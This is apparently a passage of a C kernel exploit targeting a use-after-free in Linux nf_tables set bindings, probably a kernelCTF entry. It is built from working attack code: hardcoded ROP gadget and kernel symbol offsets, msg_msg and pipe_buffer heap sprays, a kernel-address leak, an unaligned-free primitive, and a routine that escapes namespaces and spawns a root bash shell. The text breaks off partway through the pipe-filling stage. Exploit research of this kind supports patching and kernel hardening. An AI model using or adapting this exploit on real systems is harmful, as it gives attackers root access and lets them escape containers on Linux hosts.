#define _GNU_SOURCE

#include <linux/netlink.h>
#include <stdatomic.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ipc.h>
#include <time.h>
#include <string.h>
#include <stddef.h>	/* for offsetof */
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <errno.h>
#include <linux/userfaultfd.h>
#include <sys/msg.h>
#include <fcntl.h>
#include <sys/resource.h>
#include <sched.h>


#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_tables.h>

#include <libmnl/libmnl.h>
#include <libnftnl/set.h>
#include <libnftnl/table.h>
#include <libnftnl/expr.h>
#include <libnftnl/rule.h>
#include <libnftnl/chain.h>
#include <unistd.h>

#include "exploit.h"

#define KMALLOC_64_OBJS_PER_SLAB 64
#define KMALLOC_96_OBJS_PER_SLAB 42

#define MSG_QUEUES_NUM 10
#define REAL_SIZE_TO_MSG_SIZE(n) ((n - 0x30))

#define offset_anon_pipe_buf 		0x1442e00
#define offset_commit_creds         0x000fc040

// Gadgets
// 0xffffffff81b7b12d : push rsi ; jmp qword ptr [rsi - 0x77]
#define offset_stack_pivot_1		0xb7b12d
// 0xffffffff811ba41a : pop rsp ; ret
#define offset_stack_pivot_2		0x1ba41a
// 0xffffffff810af0d0 : pop rdi ; ret
#define offset_pop_rdi 				0xaf0d0
// 0xffffffff82795a28 : push rax ; pop rdi ; ret
#define offset_mov_rdi_rax		 	0x1795a28
// 0xffffffff811fa29a : pop rsi ; ret
#define offset_pop_rsi 				0x1fa29a
// 0xffffffff819dc514 : push rax ; jmp qword ptr [rsi - 0x7f]
#define offset_push_rax_jmp_qword_ptr_rsi 	0x9dc514


// Kernel functions offsets
#define offset_prepare_kernel_cred	0x0fc310
// 0xffffffff8200100b <common_interrupt_return+27>:     mov    rdi,rsp - inside swapgs_restore_regs_and_return_to_usermode
#define offset_swapgs_restore_regs_and_return_to_usermode 	0x100100b
#define offset_switch_task_namespaces 						0xfa250
#define offset_init_nsproxy 								0x1a8b1c0
#define offset_find_task_by_vpid 							0xf2050

uint32_t seq;
uint32_t cb_seq;
struct mnl_socket * nl;
typedef void (*tmpl_build_payload)(struct nlmsghdr *, void *);

// Thanks chatgpt
#define MAX_INPUT_SIZE 50
#define CHECK_INPUT_FOR_CONT                   \
    do {                                         \
        char input[MAX_INPUT_SIZE];              \
        while (1) {                              \
            printf("Enter input: ");             \
            fgets(input, MAX_INPUT_SIZE, stdin); \
            input[strcspn(input, "\n")] = 0;     \
            if (strstr(input, "cont") != NULL) { \
                break;                           \
            }									 \
        }                                        \
    } while (0)

void hex_dump(const void* data, size_t size) {
    const unsigned char* p = (const unsigned char*)data;
    size_t i, j;

    for (i = 0; i < size; i += 16) {
        printf("%08zx: ", i);
        for (j = 0; j < 16; j++) {
            if (i + j < size)
                printf("%02x ", p[i + j]);
            else
                printf("   ");
        }
        printf(" ");
        for (j = 0; j < 16 && i + j < size; j++) {
            unsigned char c = p[i + j];
            printf("%c", (c >= 32 && c < 127) ? c : '.');
        }
        printf("\n");
    }
}

int build_and_send_nlmsg_with_cb(uint16_t type, uint16_t family, uint16_t flags, 
							tmpl_build_payload build_payload_func, void * obj, 
							int (*cb)(const struct nlmsghdr *nlh, void *data), void *cb_data) {

	struct nlmsghdr *nlh;
	struct mnl_nlmsg_batch *batch;
	char buf[MNL_SOCKET_BUFFER_SIZE];

	batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

	nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
	uint32_t tmp_seq = seq;
	mnl_nlmsg_batch_next(batch);

	nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
				    type, family,
				    flags, seq++);

	if (build_payload_func)
		build_payload_func(nlh, obj);
	mnl_nlmsg_batch_next(batch);

	nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	ssize_t ret = mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
				mnl_nlmsg_batch_size(batch));
	if (ret == -1) {
		perror("mnl_socket_sendto");
		exit(EXIT_FAILURE);
	}

	mnl_nlmsg_batch_stop(batch);

	ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
	if (ret == -1) {
		perror("mnl_socket_recvfrom");
		exit(EXIT_FAILURE);
	}

	while (ret > 0) {
		ret = mnl_cb_run(buf, ret, 0, mnl_socket_get_portid(nl), NULL, NULL);
		if (ret <= 0)
			break;
		ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));		
	}
	if (ret < 0 && errno != EAGAIN) {
		// printf("Error: %d\n", errno);
		// perror("mnl_cb_run");
	}
	return 0;
}

int build_and_send_nlmsg(uint16_t type, uint16_t family, uint16_t flags, 
							tmpl_build_payload build_payload_func, void * obj) {
	return build_and_send_nlmsg_with_cb(type, family, flags, build_payload_func, obj, NULL, NULL);
}

void create_table(char * table_name) {

	struct nftnl_table *table;
	uint16_t family = NFPROTO_IPV4;

	table = nftnl_table_alloc();
	if (table == NULL)
	{
		perror("table alloc oom");
		return;
	}

	// Set it to IPv4
	nftnl_table_set_u32(table, NFTNL_TABLE_FAMILY, family);
	// Set our table name
	nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);

	build_and_send_nlmsg(NFT_MSG_NEWTABLE ,family, NLM_F_CREATE | NLM_F_ACK, 
							nftnl_table_nlmsg_build_payload, table);

	nftnl_table_free(table);
}

void delete_table(char * table_name) {

	struct nftnl_table *table;
	uint16_t family = NFPROTO_IPV4;

	table = nftnl_table_alloc();
	if (table == NULL)
	{
		perror("table alloc oom");
		return;
	}
	// Set our table name
	nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);

	build_and_send_nlmsg(NFT_MSG_DELTABLE ,family, NLM_F_CREATE | NLM_F_ACK, 
							nftnl_table_nlmsg_build_payload, table);

	nftnl_table_free(table);
}

void create_set(char * set_name, char * table_name) {

	struct nftnl_set *set;
	uint16_t family = NFPROTO_IPV4;

	set = nftnl_set_alloc();

	if (set == NULL)
	{
		perror("set alloc oom");
		return;
	}
	nftnl_set_set_str(set, NFTNL_SET_TABLE, table_name);
	nftnl_set_set_str(set, NFTNL_SET_NAME, set_name);
	nftnl_set_set_u32(set, NFTNL_SET_FAMILY, family);
	nftnl_set_set_u32(set, NFTNL_SET_KEY_LEN, 8);
	/* inet service type, see nftables/include/datatypes.h */
	nftnl_set_set_u32(set, NFTNL_SET_KEY_TYPE, TYPE_INTEGER);

	nftnl_set_set_u32(set, NFTNL_SET_DATA_TYPE, TYPE_INTEGER);
	nftnl_set_set_u32(set, NFTNL_SET_DATA_LEN, 8);

	nftnl_set_set_u32(set, NFTNL_SET_ID, 1);
	nftnl_set_set_u32(set, NFTNL_SET_FLAGS, NFT_SET_EVAL | NFT_SET_TIMEOUT | NFT_SET_MAP);
	nftnl_set_set_u64(set, NFTNL_SET_TIMEOUT, 100000);

	build_and_send_nlmsg(NFT_MSG_NEWSET, family, NLM_F_CREATE | NLM_F_ACK, 
							nftnl_set_nlmsg_build_payload, set);

	nftnl_set_free(set);
	
}

void delete_set(char * set_name, char * table_name) {

	struct nftnl_set *set;
	uint16_t family = NFPROTO_IPV4;

	set = nftnl_set_alloc();

	if (set == NULL)
	{
		perror("set alloc oom");
		return;
	}
	nftnl_set_set_str(set, NFTNL_SET_TABLE, table_name);
	nftnl_set_set_str(set, NFTNL_SET_NAME, set_name);
	build_and_send_nlmsg(NFT_MSG_DELSET, family, NLM_F_CREATE | NLM_F_ACK, 
							nftnl_set_nlmsg_build_payload, set);

	nftnl_set_free(set);
	
}

void delete_rule(char * table_name, char * chain_name, uint64_t handle) {

	struct nftnl_rule *rule;
	uint16_t family = NFPROTO_IPV4;

	rule = nftnl_rule_alloc();
	if (rule == NULL)
	{
		perror("set alloc oom");
		return;
	}
	nftnl_rule_set_str(rule, NFTNL_RULE_TABLE, table_name);
	nftnl_rule_set_str(rule, NFTNL_RULE_CHAIN, chain_name);
	nftnl_rule_set_u64(rule, NFTNL_RULE_HANDLE, handle);
	build_and_send_nlmsg(NFT_MSG_DELRULE, family, NLM_F_CREATE | NLM_F_ACK, 
							nftnl_rule_nlmsg_build_payload, rule);

	nftnl_rule_free(rule);
	
}

void create_chain(char * chain_name, char * table_name) {

	struct nftnl_chain *chain = nftnl_chain_alloc();
	uint16_t family = NFPROTO_IPV4;

	if (chain == NULL)
	{
		perror("chain alloc oom");
		return;
	}

	nftnl_chain_set_str(chain, NFTNL_CHAIN_TABLE, table_name);
	nftnl_chain_set_str(chain, NFTNL_CHAIN_NAME, chain_name);
	nftnl_chain_set_u32(chain, NFTNL_CHAIN_HOOKNUM, NF_INET_LOCAL_IN);
	nftnl_chain_set_u32(chain, NFTNL_CHAIN_FAMILY, family);
	nftnl_chain_set_u32(chain, NFTNL_CHAIN_POLICY, NF_ACCEPT);
	nftnl_chain_set_str(chain, NFTNL_CHAIN_TYPE, "filter");
	nftnl_chain_set_s32(chain, NFTNL_CHAIN_PRIO, 1337);

	build_and_send_nlmsg(NFT_MSG_NEWCHAIN, family, NLM_F_CREATE | NLM_F_ACK, 
							nftnl_chain_nlmsg_build_payload, chain);

	nftnl_chain_free(chain);
}

void create_lookup_rule(char * table_name, char * chain_name, char * set_name) {

	struct nftnl_rule *rule = nftnl_rule_alloc();
	uint16_t family = NFPROTO_IPV4;

	if (rule == NULL)
	{
		perror("rule alloc oom");
		return;
	}

	// Basic rule header
	nftnl_rule_set_str(rule, NFTNL_RULE_TABLE, table_name);
	nftnl_rule_set_str(rule, NFTNL_RULE_CHAIN, chain_name);
	nftnl_rule_set_u32(rule, NFTNL_RULE_FAMILY, NFPROTO_IPV4);

	// Get the ip addr from reg1 and update "myset"
	struct nftnl_expr * lookup_expr = nftnl_expr_alloc("lookup");
	nftnl_expr_set_u32(lookup_expr, NFTNL_EXPR_LOOKUP_SREG, NFT_REG_1);
	nftnl_expr_set_u32(lookup_expr, NFTNL_EXPR_LOOKUP_DREG, NFT_REG_1);
	nftnl_expr_set_str(lookup_expr, NFTNL_EXPR_LOOKUP_SET, set_name);

	nftnl_rule_add_expr(rule, lookup_expr);

	build_and_send_nlmsg(NFT_MSG_NEWRULE, family, NLM_F_CREATE | NLM_F_ACK, 
							nftnl_rule_nlmsg_build_payload, rule);

	nftnl_rule_free(rule);
}

void create_set_with_dynset(char * table_name, char * set_name) {

	struct nftnl_set *set;
	uint16_t family = NFPROTO_IPV4;

	set = nftnl_set_alloc();

	if (set == NULL)
	{
		perror("set alloc oom");
		return;
	}
	nftnl_set_set_str(set, NFTNL_SET_TABLE, table_name);
	nftnl_set_set_str(set, NFTNL_SET_NAME, set_name);
	nftnl_set_set_u32(set, NFTNL_SET_FAMILY, family);
	nftnl_set_set_u32(set, NFTNL_SET_KEY_LEN, 8);
	nftnl_set_set_u32(set, NFTNL_SET_KEY_TYPE, TYPE_INTEGER);
	nftnl_set_set_u32(set, NFTNL_SET_ID, 1);
	nftnl_set_set_u32(set, NFTNL_SET_FLAGS, NFT_SET_EVAL | NFT_SET_TIMEOUT);
	nftnl_set_set_u64(set, NFTNL_SET_TIMEOUT, 100000);

	// Get the ip addr from reg1 and update "myset"
	struct nftnl_expr * dynset_update_expr = nftnl_expr_alloc("dynset");
	nftnl_expr_set_u32(dynset_update_expr, NFTNL_EXPR_DYNSET_OP, NFT_DYNSET_OP_ADD);
	nftnl_expr_set_u32(dynset_update_expr, NFTNL_EXPR_DYNSET_SREG_KEY, NFT_REG_1);
	nftnl_expr_set_u32(dynset_update_expr, NFTNL_EXPR_DYNSET_SREG_DATA, NFT_REG_2);
	nftnl_expr_set_str(dynset_update_expr, NFTNL_EXPR_DYNSET_SET_NAME, "myset");

	nftnl_set_add_expr(set, dynset_update_expr);

	// printf("Adding dynset to trigger set.....\n");
	build_and_send_nlmsg(NFT_MSG_NEWSET, family, NLM_F_CREATE | NLM_F_ACK, 
							nftnl_set_nlmsg_build_payload, set);

	// printf("Added dynset to trigger set\n");

	nftnl_set_free(set);
}

void create_set_with_lookup(char * table_name, char * temp_set_name, char * bind_set_name) {

	struct nftnl_set *set;
	uint16_t family = NFPROTO_IPV4;

	set = nftnl_set_alloc();

	if (set == NULL)
	{
		perror("set alloc oom");
		return;
	}
	nftnl_set_set_str(set, NFTNL_SET_TABLE, table_name);
	nftnl_set_set_str(set, NFTNL_SET_NAME, temp_set_name);
	nftnl_set_set_u32(set, NFTNL_SET_FAMILY, family);
	nftnl_set_set_u32(set, NFTNL_SET_KEY_LEN, 8);
	nftnl_set_set_u32(set, NFTNL_SET_KEY_TYPE, TYPE_INTEGER);
	nftnl_set_set_u32(set, NFTNL_SET_ID, 1);
	nftnl_set_set_u32(set, NFTNL_SET_FLAGS, NFT_SET_EVAL | NFT_SET_TIMEOUT);
	nftnl_set_set_u64(set, NFTNL_SET_TIMEOUT, 100000);

	struct nftnl_expr * lookup_expr = nftnl_expr_alloc("lookup");
	nftnl_expr_set_u32(lookup_expr, NFTNL_EXPR_LOOKUP_SREG, NFT_REG_1);
	nftnl_expr_set_u32(lookup_expr, NFTNL_EXPR_LOOKUP_DREG, NFT_REG_1);
	nftnl_expr_set_str(lookup_expr, NFTNL_EXPR_LOOKUP_SET, bind_set_name);

	nftnl_set_add_expr(set, lookup_expr);

	// printf("Adding lookup to trigger set.....\n");
	build_and_send_nlmsg(NFT_MSG_NEWSET, family, NLM_F_CREATE | NLM_F_ACK, 
							nftnl_set_nlmsg_build_payload, set);

	// printf("Added lookup to trigger set\n");

	nftnl_set_free(set);
}

// save_state, set_cpu_affinity and pop_shell mostly adjusted from: 
// https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2023-3390_lts_cos_mitigation/exploit/extra-refined/exploit.c
unsigned long cs;
unsigned long rsp;
unsigned long ss;
unsigned long rflags;
void save_state()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq\n"
        "popq %2\n"
        "movq %%rsp, %3\n"
        : "=r"(cs), "=r"(ss), "=r"(rflags), "=r"(rsp)
        :
        : "memory");
}

void set_cpu_affinity(int cpu_n, pid_t pid)
{
    cpu_set_t *set = malloc(sizeof(cpu_set_t));

    CPU_ZERO(set);
    CPU_SET(cpu_n, set);

    if (sched_setaffinity(pid, sizeof(cpu_set_t), set) < 0)
    {
        perror("sched_setaffinity");
        return;
    }
    free(set);
}

void pop_shell() {
	printf("######## Exploit successful\n");
    // Move to a different cpu so we're not using the possibly broken
	// per-cpu cache in the kernel
    set_cpu_affinity(1, 0);
    sleep(1);

    // escape pid/mount/network namespace
    setns(open("/proc/1/ns/mnt", O_RDONLY), 0);
    setns(open("/proc/1/ns/pid", O_RDONLY), 0);
    setns(open("/proc/1/ns/net", O_RDONLY), 0);

    printf("[+] Starting /bin/bash as root\n");

    // drop root shell
    execlp("/bin/bash", "/bin/bash", NULL);
	for (;;) 
		;
    exit(0);
}

// Taken from https://github.com/Crusaders-of-Rust/CVE-2022-0185/blob/master/exploit_kctf.c
void unshare_setup(uid_t uid, gid_t gid)
{
    int temp;
    char edit[0x100];

    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);

    temp = open("/proc/self/setgroups", O_WRONLY);
    write(temp, "deny", strlen("deny"));
    close(temp);

    temp = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", uid);
    write(temp, edit, strlen(edit));
    close(temp);

    temp = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", gid);
    write(temp, edit, strlen(edit));
    close(temp);

    return;
}

// This should be enough to hold all of our payloads
#define MSGBUF_LEN (0x2000)
typedef struct {
	long mtype;
	char mtext[MSGBUF_LEN];
} msgbuf;

void generic_msg_spray(int qid, void * data, unsigned int size, unsigned int amount, int mtype)
{
    msgbuf *spray = (msgbuf *)malloc(sizeof(msgbuf));

	memcpy(spray->mtext, data, size);
    for (int i = 1; i <= amount; i++)
    {
		spray->mtype = mtype == -1 ? i : mtype;
		//printf("qid %d, mtype %ld, size %d\n", qid, spray->mtype, size);
        if (msgsnd(qid, spray, size, IPC_NOWAIT) == -1)
        {
            perror("msgsend failure");
            exit(-1);
        }
    }
	free(spray);
    return;
}

/* msgrcv options */
#define MSG_NOERROR     010000  /* no error if message is too big */
#define MSG_EXCEPT      020000  /* recv any msg except of specified type.*/
#define MSG_COPY        040000  /* copy (not remove) all queue messages */

void * read_msgs(int qid, uint32_t size, uint32_t amount, int should_copy, int leak_offset, int should_hexdump, int msgtype)
{
	msgbuf *buffer = (msgbuf *)malloc(sizeof(msgbuf));
	uintptr_t potential_leak_addr = 0;

    for (int i = 0; i < amount; i++)
    {
        if (msgrcv(qid, buffer, REAL_SIZE_TO_MSG_SIZE(size), should_copy ? i : msgtype, should_copy ? (IPC_NOWAIT|MSG_COPY|MSG_NOERROR) : (IPC_NOWAIT|MSG_NOERROR)) == -1)
        {
            perror("msgrcv failure");
            continue;
        }

		if (((*(uintptr_t*)(buffer->mtext + leak_offset)) & 0xffff000000000000) == 0xffff000000000000){
			potential_leak_addr = *(uintptr_t*)(buffer->mtext + leak_offset);
			//printf("Potential ptr: %p\n", (void *)potential_leak_addr);
			free(buffer);
			return (void*)potential_leak_addr;
		}
		if (should_hexdump) {
			printf("Got from msg %d:\n", i);
			hex_dump(buffer->mtext, REAL_SIZE_TO_MSG_SIZE(size) /*MSGBUF_LEN - (0x1000 - 0x30)*/);
			printf("\n\n");
		}
    }
	free(buffer);
    return NULL;
}


int main(int argc, char *argv[])
{

	struct nftnl_set *s;
	struct nlmsghdr *nlh;
	struct mnl_nlmsg_batch *batch;
	uint8_t family;
	char buf[MNL_SOCKET_BUFFER_SIZE];
	int ret;
	int msgqids[MSG_QUEUES_NUM];
	void * msg_buf = malloc(sizeof(msgbuf));
	msgbuf * msg = (msgbuf*)msg_buf;
	struct msg_msg * p_msg_msg;
	int pipefds[0x500][2] = {0};

	// Pin to first CPU
	set_cpu_affinity(0, 0);

	// Unshare so we're able to interact with nftables
	// as it requires admin capabilities 
	unshare_setup(getuid(), getgid());

	// So I can create enough pipes for spraying
	struct rlimit rlim = {0};
	rlim.rlim_cur = 0x1000;
	rlim.rlim_max = 0x1000;
	if (setrlimit(RLIMIT_NOFILE, &rlim) < 0) {
		perror("setrlimit()");
		exit(-1);
	}

	// Init msg queue ids
	for (int i = 0; i < MSG_QUEUES_NUM; i++) {
		int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
		if (qid == -1) {
			perror("msgget");
			exit(-1);
		}
		msgqids[i] = qid;
	}

	// Initialize these for nftables functions
	seq = time(NULL);
	cb_seq = 0;

	// Initialize netfilter mnl socket
	nl = mnl_socket_open(NETLINK_NETFILTER);
	if (nl == NULL) {
		perror("mnl_socket_open");
		exit(EXIT_FAILURE);
	}

	if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) {
		perror("mnl_socket_bind");
		exit(EXIT_FAILURE);
	}

	create_table("mytable");
	printf("[+] Created mytable\n");

	create_set("myset", "mytable");
	printf("[+] Created myset\n");

	create_chain("mychain", "mytable");
	printf("[+] Created mychain\n");

	printf("[+] Creating lookup rule so it thinks the set is validated\n");
	create_lookup_rule("mytable", "mychain", "myset");

	printf("[+] Creating first uaf dynset\n");
	create_set_with_dynset("mytable", "trigger_set");

	printf("[+] Spraying msg_msg (0x60) structs\n");
	// This sets the binding->chain to null, and binding->flags to NFT_SET_MAP (0x8)
	// So it short-circuits a check in nf_tables_bind_set
	memset(msg_buf, 0, REAL_SIZE_TO_MSG_SIZE(0x60));
	memset((char*)msg_buf + REAL_SIZE_TO_MSG_SIZE(0x60 - 0x8), 0x8, 0x8);
	generic_msg_spray(msgqids[0], msg_buf, REAL_SIZE_TO_MSG_SIZE(0x60), KMALLOC_96_OBJS_PER_SLAB, -1);

	printf("[+] Creating 1 lookup rule\n");
	create_lookup_rule("mytable", "mychain", "myset"); // handle id 4

	printf("[+] Triggering UAF on a lookup (size 0x40)\n");
	create_set_with_lookup("mytable", "trigger_set", "myset");

	printf("[+] Overwriting freed struct nft_expr (lookup) with struct msg_msg\n");
	memset(msg_buf, 0x41, REAL_SIZE_TO_MSG_SIZE(0x40));
	generic_msg_spray(msgqids[1], msg_buf, REAL_SIZE_TO_MSG_SIZE(0x40), KMALLOC_64_OBJS_PER_SLAB, -1);	

	printf("[+] Releasing rule 4, and overwriting freed lookup.list.prev field\n");
	delete_rule("mytable", "mychain", 4);

	// Read the msg_msgseg->next field of the chunk we're about to free, and overwrite it with a nullptr.
	// By leaking this address we're verifying that the unaligned free will work later in the exploit
	// We have no use for the address itself, but just the fact that we're leaking it, meaning we're ok
	// in this step.
	int target_mtype = -1;
	uintptr_t potential_leak_addr;
	{
		msgbuf *buffer = (msgbuf *)malloc(sizeof(msgbuf));
		for (int i = 1; i <= KMALLOC_96_OBJS_PER_SLAB; i++)
		{
			if (msgrcv(msgqids[0], buffer, REAL_SIZE_TO_MSG_SIZE(0x60), 0, (IPC_NOWAIT|MSG_COPY|MSG_NOERROR)) == -1)
			{
				perror("msgrcv failure");
				exit(-1);
			}
			if (((*(uintptr_t*)(buffer->mtext + 0x10)) & 0xffff000000000000) == 0xffff000000000000){
				potential_leak_addr = *(uintptr_t*)(buffer->mtext + 0x10);
				target_mtype = buffer->mtype;
				printf("[*] Leaked uaf_dynset.list.next ptr: %p\n", (void *)potential_leak_addr);
				printf("[*] Targeting qid %d, mtype %d\n", msgqids[0], target_mtype);
				printf("[+] Overwriting msg_msg->next->next with a nullptr\n");
				msgrcv(msgqids[0], buffer, REAL_SIZE_TO_MSG_SIZE(0x60), target_mtype, (IPC_NOWAIT|MSG_NOERROR));

				// Using a new msgqid so I can target it specifically, without the need to traverse the
				// linked list of msgs in msgqids[0], because it's going to break with the unaligned free.
				generic_msg_spray(msgqids[2], msg_buf, REAL_SIZE_TO_MSG_SIZE(0x60), KMALLOC_96_OBJS_PER_SLAB*2, target_mtype);
			}
		}
	}
	if (potential_leak_addr == 0) {
		printf("Failed leaking uaf_dynset.list.next ptr\n");
		exit(-1);
	}

	printf("[+] Triggering unaligned free\n");
	read_msgs(msgqids[1], 0x40, KMALLOC_64_OBJS_PER_SLAB, false, 0, false, 0);

	for (int i=0; i<0x100; i++) {
		if (pipe(pipefds[i]) < 0) {
			perror("pipe()");
			exit(-1);
		}
		fcntl(pipefds[i][1], F_SETPIPE_SZ, 2 * 0x1000);
		write(pipefds[i][1], "AAAAAAAA", 8);
	}

	printf("[+] Trying to leak a anon_pipe_buf_ops ptr with msg_msg\n");
	void * leaked_func_ptr = read_msgs(msgqids[2], 0x60, KMALLOC_96_OBJS_PER_SLAB * 2, true, 0x20, false, 0);
	if (leaked_func_ptr == NULL) {
		printf("Failed to leak anon_pipe_buf_ops\n");
		exit(-1);
	}

	printf("[*] Address of anon_pipe_buf_ops: %p\n", leaked_func_ptr);
	uint64_t kbase_addr = (uint64_t)((char*)leaked_func_ptr - offset_anon_pipe_buf);
	printf("[*] Kernel base at: %p\n", kbase_addr);

	//// Now leak a kmalloc-4k heap addr
	// Free the space in the unaligned memory
	for (int i=0; i<0x100; i++) {
		if (close(pipefds[i][0]) < 0) {
			perror("close pipefd[0]");
			exit(-1);
		}
		if (close(pipefds[i][1]) < 0) {
			perror("close pipefd[0]");
			exit(-1);
		}
	}
	// Reclaim it with msg_msg
	int * msgqids2 = (int*)malloc(sizeof(int) * 0x200);
	for (int i = 0; i < 0x200; i++) {
		int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
		if (qid == -1) {
			perror("msgget");
			exit(-1);
		}
		msgqids2[i] = qid;
		memset(msg_buf, 0, sizeof(msgbuf));
		msgbuf * spray = (msgbuf*)msg_buf;
		spray->mtype = 0x2000 + i;
		msgsnd(qid, msg_buf, REAL_SIZE_TO_MSG_SIZE(0x60), IPC_NOWAIT);
		spray->mtype += 0x10000;
		msgsnd(qid, msg_buf, REAL_SIZE_TO_MSG_SIZE(0x1000), IPC_NOWAIT);
	}

	// Now try to leak a msg.list.next that points to a 4k heap chunk
	void * leaked_4k_chunk = NULL;
	void * leaked_msq_head = NULL;
	target_mtype = 0;
	for (int i = 0; i < KMALLOC_96_OBJS_PER_SLAB * 2; i++) {
		memset(msg_buf, 0, sizeof(msgbuf));
		if (msgrcv(msgqids[2], msg_buf, REAL_SIZE_TO_MSG_SIZE(0x60), i, IPC_NOWAIT|MSG_COPY|MSG_NOERROR) < 0) {
			perror("msgrcv 0x60");
			exit(-1);
		};
		p_msg_msg = (struct msg_msg *)(msg->mtext + 0x10);
		if ((((uintptr_t)(p_msg_msg->m_list.next)) & 0xffff000000000000) == 0xffff000000000000){
			leaked_4k_chunk = p_msg_msg->m_list.next;
			leaked_msq_head = p_msg_msg->m_list.prev;
			target_mtype = p_msg_msg->m_type;
			break;
		}
	}
	if (target_mtype < 0x2000) {
		printf("Failed to leak unaligned chunk\n");
		exit(-1);
	}
	printf("[*] Address of a leaked cg-4k heap chunk: %p\n", leaked_4k_chunk);
	printf("[*] Address of leaked_msq_head: %p\n", leaked_msq_head);
	// printf("mtype of unaligned msg_msg: %d\n", target_mtype);

	printf("[+] Freeing the unaligned msg_msg\n");
	int target_qid = target_mtype - 0x2000;
	if (msgrcv(msgqids2[target_qid], msg_buf, REAL_SIZE_TO_MSG_SIZE(0x60), target_mtype, IPC_NOWAIT|MSG_NOERROR) < 0) {
		perror("msgrcv target_qid");
		exit(-1);
	};

	printf("[+] Allocating a msg_msg in the unaligned chunk, with same queue id\n");
	generic_msg_spray(msgqids2[target_qid], msg_buf, REAL_SIZE_TO_MSG_SIZE(0x60), KMALLOC_96_OBJS_PER_SLAB + 0x10, target_mtype);

	printf("[+] Freeing the chunk before the unaligned msg_msg\n");
	void * leaked_ptr = read_msgs(msgqids[2], 0x60, KMALLOC_96_OBJS_PER_SLAB * 2, false, 0x10, false, 0);
	// Basic sanity check
	if (leaked_ptr == 0) {
		perror("Failed getting before the unaligned chunk");
		exit(-1);
	}

	printf("[+] Releasing leaked 4k chunk msg_msg (before unlinking it in the next step)\n");
	if (msgrcv(msgqids2[target_qid], msg_buf, REAL_SIZE_TO_MSG_SIZE(0x1000), target_mtype + 0x10000, IPC_NOWAIT|MSG_NOERROR) < 0) {
		perror("msgrcv target_qid 4k");
		exit(-1);
	};

	printf("[+] Overwriting the msg->m_list.next of the unaligned msg_msg to leaked_4k_chunk + 0x100\n");
	memset(msg_buf, 0, sizeof(msgbuf));
	msg->mtype = 0x4567;
	p_msg_msg = (struct msg_msg *)(msg->mtext + 8);
	p_msg_msg->m_list.next = leaked_4k_chunk + 0x100;
	p_msg_msg->m_list.prev = leaked_msq_head;
	p_msg_msg->m_type = 0x7331;
	p_msg_msg->m_ts = 0x200;

	generic_msg_spray(msgqids[8], msg_buf, REAL_SIZE_TO_MSG_SIZE(0x60), 0x50, target_mtype);

	printf("[+] Preparing fake msg_msg inside a 4k-cg msg_msg\n");
	memset(msg_buf, 0, sizeof(msgbuf));
	p_msg_msg = (struct msg_msg *)(msg->mtext + 0x100 - sizeof(struct msg_msg));
	p_msg_msg->m_list.next = leaked_msq_head;
	p_msg_msg->m_list.prev = leaked_msq_head;
	p_msg_msg->m_type = 0x17331;
	p_msg_msg->m_ts = 0x700;
	uint64_t magic1 = 0xdeadbeefbabecafe;
	memcpy(msg->mtext + 0x100, &magic1, sizeof(magic1));

	int * msgqids4 = (int*)malloc(sizeof(int) * 0x50);
	for (int i = 0; i < 0x50; i++) {
		int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
		if (qid == -1) {
			perror("msgget");
			CHECK_INPUT_FOR_CONT;
			exit(-1);
		}
		msgqids4[i] = qid;
		msg->mtype = 0x15000 + i;
		if (msgsnd(qid, msg_buf, REAL_SIZE_TO_MSG_SIZE(0x1000), IPC_NOWAIT) < 0) {
			perror("msgsnd msgqids4");
			CHECK_INPUT_FOR_CONT;
			exit(-1);
		}
	}
	
	// We now initialize the pipes that we'll use a moment later for filling the unaligned 4k chunk
	// I initialize them now, each with a page allocation, so that the pages won't take our unaligned
	// memory instead of the pipe_buffer object.
	printf ("[+] Initializing pipes for later usage\n");
	for (int i=0; i<0x20; i++) {
		if (pipe(pipefds[i]) < 0) {
			perror("pipe()");
			exit(-1);
		}
		// We must write to the pipe to trigger allocation of pipe_buffer struct
		// with the ops ptr that we want to overwrite
		write(pipefds[i][1], "AAAAAAAA", 8);
	}

	printf("[+] Triggering unaligned free in 4k-cg heap\n");
	memset(msg_buf, 0, sizeof(msgbuf));
	// if (msgrcv(msgqids2[target_qid], msg_buf, REAL_SIZE_TO_MSG_SIZE(0x60), 0x7331, IPC_NOWAIT|MSG_NOERROR) < 0) {
	if (msgrcv(msgqids2[target_qid], msg_buf, REAL_SIZE_TO_MSG_SIZE(0x60), 0x17331, IPC_NOWAIT|MSG_NOERROR) < 0) {
			perror("msgrcv unaligned free");
			CHECK_INPUT_FOR_CONT;
			exit(-1);
	};
	// We validate the free by reading the magic we placed right after the fake msg_msg
	uint64_t should_be_magic1 = *(uint64_t*)(msg->mtext);
	if (should_be_magic1 != magic1) {
		printf("Failed finding magic value, probably failed to free the correct msg_msg\n");
		CHECK_INPUT_FOR_CONT;
		exit(-1);
	}
	printf("[*] Got unaligned free in 4k heap chunk!\n");
	printf("[+] Filling unaligned 4k heap with pipe objects\n");
	for (int i=0; i<0x20; i++) {
		if (fcntl(pipefds[i][0], F_SETPIPE_SZ, 0x40 * 0x1000) < 0) {
			perror("fcntl");
			exit(-1);
		}
